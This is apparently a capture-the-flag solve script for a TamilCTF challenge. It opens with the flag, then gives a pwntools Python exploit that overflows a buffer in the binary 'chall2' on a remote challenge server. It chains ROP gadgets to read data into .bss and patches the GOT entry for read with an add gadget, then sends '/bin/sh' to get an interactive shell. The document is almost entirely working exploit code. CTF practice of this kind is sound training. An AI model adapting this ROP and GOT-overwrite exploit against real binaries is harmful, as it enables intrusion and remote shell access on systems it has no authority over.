#TamilCTF{N0W_u_kN0w_4BouT_L4zY_B1nD1nG_M3th0D_17_Is_r34LLy_Gr347_1F_Y0u_Don3_7H1S_M3Th0D_w17h0u7_7h3_us3_0F_dl_r3solv3_pwn700Ls_m3th0Ds_bC0z_cr4f71nG_0wN_sYm_sTRucTs_4nD_R3L_StrUc7s_is_G00D_l34rNing_And_Fun}
from pwn import *

elf = ELF("./chall2")

#target = process([elf.path])
target = remote("3.99.48.161", 9004)

ret = p64(0x000000000040120c)
pop_rdi = p64(0x000000000040120b)
pop_rsi_r15 = p64(0x0000000000401209)
pop_rbp = p64(0x0000000000401129)
bss = p64(0x404230)
#0x0000000000401128 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret
adder = p64(0x0000000000401128)
#0x0000000000401202 : pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
pop_rbx = p64(0x0000000000401202)

payload = "A"*40
payload += pop_rdi + p64(0) + pop_rsi_r15 + bss + p64(0) + p64(elf.plt['read'])
payload += pop_rbx + p64(0xfffffffffff442e0) + p64(0x9008)*5
payload += pop_rbp + p64(elf.got['read'] + 0x3d)
payload += adder
payload += pop_rdi + bss
payload += ret + p64(elf.plt['read'])

target.sendline(payload)

target.sendline("/bin/sh\x00")

target.interactive()